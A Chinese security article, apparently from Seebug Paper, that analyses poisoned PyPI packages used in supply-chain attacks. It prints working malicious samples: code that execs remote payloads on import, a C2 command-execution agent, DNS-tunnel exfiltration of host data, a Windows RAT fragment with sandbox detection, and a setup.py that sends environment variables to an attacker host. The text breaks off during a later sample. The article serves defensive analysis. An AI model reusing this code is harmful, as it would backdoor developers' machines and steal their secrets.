**作者：Coco413  
本文为作者投稿，Seebug Paper 期待你的分享，凡经采用即有礼品相送！  
投稿邮箱：PI:EMAIL **
### 0x01 起因前言
供应链攻击从去年年底SolarWinds到今年四月初的XcodeSpy后门、PHP仓库被黑篡改源码等爆发出来的事件越发频繁，同时最近也在护网期间，每年护网给我的感受在攻击突破口上会有一些趋势变化的亮点，例如刚开始大家主要高频使用一些1day、姿势绕过等，后面慢慢的集中在一些脑洞钓鱼、物理社工、0day等利用，到了这两年有一些瞄准各类安全厂商防护、边界设备的趋势，这种趋势的变化也很正常，红队随着蓝队防御体系不断健全变换各种突破手法，蓝队也随着红队多样的切入点拉长防守面；从今年护网爆发出来和安全设备相关的漏洞来看0day突破口基本还是代码层的问题，但假设这些问题不是开发造成而是提前被攻击者通过供应链投递进来的恶意代码呢，蓝队护网还是比较依赖于各种监控平台数据，如果它们成为了对手的"卧底"，那么可能前期防御方案做的再完善也难抵后院起火。在红队的角度来看，希望不断寻找一些防守方不变的东西从而去稳定攻击，而甲方护网前不断新增部署的防护设备就正是一项不变的策略，以彼之盾攻彼之盾。
结合现在护网蓝队也需要反制到红队主机才能得分规则，那么定向供应链攻击我猜想可能接下来会成为双方都比较青睐的攻击反制手段。
* * *
### 0x02 供应链攻击之PyPI仓库投毒
#### 1、什么是供应链攻击
> 供应链攻击(Supply Chain
> Attack)是一种防御上很难做到完美规避的攻击方式，由于现在的软件工程，各种包/模块的依赖十分频繁、常见，而开发者们很难做到一一检查，默认都过于信任市面上流通的包管理器，这就导致了供应链攻击几乎已经成为必选攻击之一。把这种攻击称成为供应链攻击，是为了形象说明这种攻击是一种依赖关系，一个链条，任意环节被感染都会导致链条之后的所有环节出问题。
供应链攻击具有隐蔽性强、影响范围广、投入产出比高等特点，通常会在三个阶段植入恶意木马， **开发阶段**
（IDE编辑器、预留后门等，例如[2020年-SolarWinds官方被黑事件](https://s.tencent.com/research/report/1199.html)）、
**交付阶段**
（下载站、Git仓库官网等，例如[2021年-PHP仓库被黑事件](https://www.renfei.net/posts/1003485)）、
**使用阶段**
（升级劫持、官方云控等，例如[2018年-驱动人生升级劫持木马事件](https://www.160.com/notice1219.html)）；
这三个阶段中和我们平时工作关联较多的大致在开发阶段，需要用到一些开源组件、依赖环境等，通常获取这些依赖模块会去下载集成环境或者一些第三方软件包平台例如NPM、PyPI
和
RubyGems等，如果这些平台提供的包或者模块出现了问题，那么可能代码一行未写，病毒已入，接下来以Pypi仓库投毒举例，站在攻防两个角度看待开发阶段仓库的供应链攻击。
#### 2、PyPI仓库投毒
PyPI是Python第三方软件包管理工具平台，所有开发者都可以发布自己制作的模块包，如果攻击者上传了一些伪装恶意模块包并用一些具有迷惑性命名（例如L和1、0和o以及一些大小写名称等）、用户习惯相似易敲错命名（例如requests和request、pysmb和smb等）或者一些官方、内部被抢注的模块包，那么开发者不小心敲错即被中招；通常这些伪造包都依然满足原先包模块功能，加上用户对官方源的信任，不容易被发现。
* * *
### 0x03、常见投毒手法
通过分析34份恶意样本及相关历史攻击事件，把常见的投毒攻击手法整理如下：
#### 1、通过`__init__.py`触发执行恶意代码
  * ##### covd-1.0.4
伪装covid模块包，在`__init.py`文件中添加恶意代码下发c2服务器上病毒脚本，当模块被导入时触发请求；下发部分对c2地址、exec关键字使用hex编码隐藏，利用builtins内置函数exec去调用执行，木马部分主要用来做进程的持久化，不断轮训获取操作指令。
    # covd-1.0.4/covid/__init__.py
    import requests as r
    import builtins
    try:
      getattr(builtins, bytes.fromhex('65786563').decode())(r.get(bytes.fromhex('687474703a2f2f612e7361626162612e776562736974652f676574').decode()).text)
    except:
      pass
    # get
    def __agent():
        try:
            from urllib import request
            import json
            import subprocess
            while True:
                req = request.Request("https://sababa.website/api/ready", method="POST")
                r = request.urlopen(req)
                response = r.read()
                if response:
                    task = json.loads(response.decode())
                    try:
                        process = subprocess.Popen(task['command'], stderr=subprocess.PIPE, stdout=subprocess.PIPE, cwd=task.get('working_directory'))
                        stdout, stderr = process.communicate()
                        stdout = stdout.decode()
                        stderr = stderr.decode()
                        exit_code = process.wait()
                    except Exception as e:
                        stdout = ''
                        stderr = str(e)
                        exit_code = 155
                    data = {'task': task, 'exit_code': exit_code, 'stdout': stdout, 'stderr': stderr}
                    data = json.dumps(data).encode()
                    request.urlopen(request.Request('https://sababa.website/api/done', method="POST"), data=data)
        except Exception as e:
            raise
    import threading
    threading.Thread(target=__agent, daemon=True).start()
  * ##### tensorflow_serving-9.7.0
伪造tensorflow_serving-api模块包，正常包导入是`import
tensorflow_serving.apis`方式，用户以为apis是tensorflow_serving下的，直接`pip install
tensorflow_serving`导致被中招；这个恶意包把获取到执行结果编码转换成子域名形式，然后使用nslooup去自建的NS服务器查询该域名从而把结果数据隐蔽的传递出去，以及在执行系统命令时调用try_call函数从而去绕过一些静态规则的匹配。
    # tensorflow_serving-9.7.0/tensorflow_serving/__init__.py
    import os
    import socket
    import json
    import binascii
    import random
    import string
    PACKAGE = 'tensorflow_serving'
    SUFFIX = '.dns.alexbirsan-hacks-paypal.com';
    NS = 'dns1.alexbirsan-hacks-paypal.com';
    def generate_id():
        return ''.join(random.choice(
            string.ascii_lowercase + string.digits) for _ in range(12)
        )
    def get_hosts(data):
        data = binascii.hexlify(data.encode('utf-8'))
        data = [data[i:i+60] for i in range(0, len(data), 60)]
        data_id = generate_id()
        to_resolve = []
        for idx, chunk in enumerate(data):
            to_resolve.append(
                'v2_f.{}.{}.{}.v2_e{}'.format(
                    data_id, idx, chunk.decode('ascii'), SUFFIX)
                )
        return to_resolve
    def try_call(func, *args):
        try:
            return func(*args)
        except:
            return 'err'
    data = {
        'p' : PACKAGE,
        'h' : try_call(socket.getfqdn),
        'd' : try_call(os.path.expanduser, '~'),
        'c' : try_call(os.getcwd)
    }
    data = json.dumps(data)
    to_resolve = get_hosts(data)
    for host in to_resolve:
        try:
            socket.gethostbyname(host)
        except:
            pass
    to_resolve = get_hosts(data)
    for host in to_resolve:
        os.system('nslookup {} {}'.format(host, NS))
  * ##### reols-0.1
针对windows下从沙箱识别、系统截屏到反弹shell等一套流程的恶意脚本，木马主体在本地脚本，具体执行的参数c2进行下发。
    # reols-0.1/reols/__init__.py
    import socket, os, sys, platform, time, ctypes, subprocess, webbrowser, sqlite3, pyscreeze, threading, pynput.keyboard, wmi
    import win32api, winerror, win32event, win32crypt
    from shutil import copyfile
    from winreg import *
    strHost = socket.gethostbyname("securedmaininfo5.zapto.org")
    intPort = 3000
    strPath = os.path.realpath(sys.argv[0])  # get file path
    TMP = os.environ["TEMP"]  # get temp path
    APPDATA = os.environ["APPDATA"]
    intBuff = 1024
    mutex = win32event.CreateMutex(None, 1, "PA_mutex_xp4")
    if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
        mutex = None
        sys.exit(0)
    def detectSandboxie():
        try:
            libHandle = ctypes.windll.LoadLibrary("SbieDll.dll")
            return " (Sandboxie) "
        except: return ""
    def detectVM():
        objWMI = wmi.WMI()
        for objDiskDrive in objWMI.query("Select * from Win32_DiskDrive"):
            if "vbox" in objDiskDrive.Caption.lower() or "virtual" in objDiskDrive.Caption.lower():
                return " (Virtual Machine) "
        return ""
    ......
#### 2、通过setup.py触发执行恶意代码
  * ##### virtualnv-0.1.1
把恶意代码直接放在setup.py中，当pip安装模块时进行触发，把结果信息ascii编码后夹杂在http请求头中返回。
    # virtualnv-0.1.1/setup.py
    from distutils.core import setup
    import os
    import socket
    setup(
        name='virtualnv',
        packages=['virtualnv'],
        version='0.1.1',
        description='Slimmer Virtual Environment',
        author='VirtualNV team',
        author_email='PI:EMAIL',
        url='https://pypi.python.org/pypi?name=virtualnv&:action=display',
        keywords=[],
        classifiers=[],
        install_requires=[
            'virtualenv',
        ],
    )
    try:
        info = socket.gethostname() + ' virtualnv ' + ' '.join(['%s=%s' % (k, v) for (k, v) in os.environ.items()]) + ' '
        info += [(s.connect(('8.8.8.8', 53)), s.getsockname()[0], s.close()) for s in
                 [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]
        posty = "paste="
        for i in range(0, len(info)):
            if info[i].isalnum():
                posty += info[i]
            else:
                posty += ("%%%02X" % ord(info[i]))
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("packageman.comlu.com", 80))
        s.send("POST / HTTP/1.1\r\n" +
               "User-Agent: Python\r\n" +
               "Host: packageman.comlu.com\r\n" +
               "Content-Type: application/x-www-form-urlencoded\r\n" +
               "Content-Length: " + str(len(posty)) + "\r\n\r\n" + posty)
        s.recv(2048)
    except:
        pass
  * ##### libpeshka-0.6
通过setup.py脚本setup函数下script参数调用执行pr.py恶意脚本，下发和木马主体均在本地，下载远端恶意脚本后~/.bashrc持久化。
    # libpeshka-0.6/setup.py
    from setuptools import setup, find_packages
    setup(
      name = 'libpeshka',
      packages = find_packages (),
      entry_points={